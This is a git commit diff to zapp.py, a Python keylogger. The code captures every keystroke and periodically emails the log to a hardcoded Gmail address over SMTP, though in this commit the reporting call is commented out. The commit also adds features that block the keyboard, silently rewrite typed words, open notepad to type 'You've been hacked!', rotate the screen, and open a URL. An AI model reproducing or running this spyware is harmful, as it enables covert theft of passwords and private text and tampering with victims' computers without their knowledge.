f958d34f163e1868cc659e11a5dcc2e6ce5f87d0
armaanbhullar100 <armaan.bhullar150@gmail.com>
2022-04-06 17:47:44 +1000

    Added some more functionality to zapp.py

--- zapp.py
+++ zapp.py
@@ -1,9 +1,13 @@
 import keyboard
+import mouse
 import smtplib
+import pyautogui
+import rotatescreen
+
 from threading import Timer
 from datetime import datetime
 from time import sleep
-import pyautogui
+
 
 SEND_REPORT_INTERVAL = 5
 EMAIL = "keyloggerlogs145@gmail.com"
@@ -13,6 +17,23 @@ class Keylogger:
     def __init__(self, interval):
         self.interval = interval
         self.log = ""
+
+    keys = ['q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', \
+    'z', 'x', 'c', 'v', 'b', 'n', 'm', 'enter', 'space', 'control', 'shift', 'tab', 'esc', 'alt']
+
+    autocorrect_words = {
+        ' ' : 'SPACE',
+        'there' : 'their',
+        '.com' : ',com'
+    }
+
+    def start(self):
+        # start keyloggerbasicbasicbasic
+        keyboard.on_release(callback=self.callback)
+        # start reporting keylogs
+        #self.report()
+        # block the current thread, wait until CTRL+C is pressed test
+        keyboard.wait() 
 
     # Log key when pressed
     def callback(self, event):
@@ -32,9 +53,81 @@ class Keylogger:
                 # replace spaces with underscores
                 name = name.replace(" ", "_")
                 name = f"[{name.upper()}]"
+
         # finally, add the key name to our global `self.log` variable
         self.log += name
         self.check_commands(self.log.lower())
+
+    # Find and run commands from the keyboard input
+    def check_commands(self, string):
+        #self.autocorrect(string)
+        if string.find("test") != -1:
+            self.rotate_screen()
+
+
+    # Block all inputs from the keyboard
+    def block_keys(self):
+        for key in self.keys:
+            keyboard.block_key(key)
+
+    # Unblock all input from the keyboard
+    def unblock_keys(self):
+        for key in self.keys:
+            keyboard.unhook(key)
+
+    # Simple test to check if the program works
+    def simple_test(self):
+        pyautogui.hotkey("winleft", "m")
+        pyautogui.press("winleft")
+        pyautogui.write("notepad")
+        pyautogui.press("enter")
+        sleep(0.5)
+        pyautogui.write("You've been hacked!")
+        self.log = ""
+
+    # Blocks all inputs from the keyboard for len seconds then unblocks them
+    def pause_keyboard(self, len):
+        self.block_keys()
+        sleep(len)
+        self.unblock_keys()
+        self.log = ""
+
+    def autocorrect(self, string):
+        for word in self.autocorrect_words.keys():
+            if string.find(word) != -1:
+                print(word)
+                for i in range(len(word)):
+                    keyboard.press('backspace')
+                keyboard.write(self.autocorrect_words[word])
+                self.log = ""
+    
+    def go_to_url(self):
+        pyautogui.hotkey("winleft", "r")
+        pyautogui.write("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+        pyautogui.press("enter")
+        self.log = ""
+
+    def rotate_screen(self):
+        screen = rotatescreen.get_primary_display()
+        start_pos = screen.current_orientation
+        new_pos = abs((start_pos - 90) % 360)
+        screen.rotate_to(new_pos)
+        self.log = ""
+
+
+    ########## For Keylogging ##########
+
+    # Save key log and reset timer
+    def report(self):
+        if self.log:
+            self.send_mail(self.log)
+
+        self.log = ""
+        timer = Timer(interval=self.interval, function=self.report)
+        # sets timer to daemon (dies when main thread dies)
+        timer.daemon = True
+        # start timer
+        timer.start()
 
     # Send logged keys via email
     def send_mail(self, message):
@@ -48,38 +141,6 @@ class Keylogger:
         server.sendmail(EMAIL, EMAIL, message)
         # end session
         server.quit()
-    
-    # Save key log and reset timer
-    def report(self):
-        if self.log:
-            
-            self.send_mail(self.log)
-
-        self.log = ""
-        timer = Timer(interval=self.interval, function=self.report)
-        # sets timer to daemon (dies when main thread dies)
-        timer.daemon = True
-        # start timer
-        timer.start()
-
-    def start(self):
-        # start keyloggerbasicbasicbasic
-        keyboard.on_release(callback=self.callback)
-        # start reporting keylogs
-        self.report()
-        # block the current thread, wait until CTRL+C is pressed test
-        keyboard.wait()
-
-    def check_commands(self, string):
-        if string.find("test") != -1:
-            pyautogui.hotkey("winleft", "m")
-            pyautogui.press("winleft")
-            pyautogui.write("notepad")
-            pyautogui.press("enter")
-            sleep(0.5)
-            pyautogui.write("You've been hacked!")
-            self.log = ""
-
 
 if __name__ == "__main__":
     keylogger = Keylogger(interval=SEND_REPORT_INTERVAL)
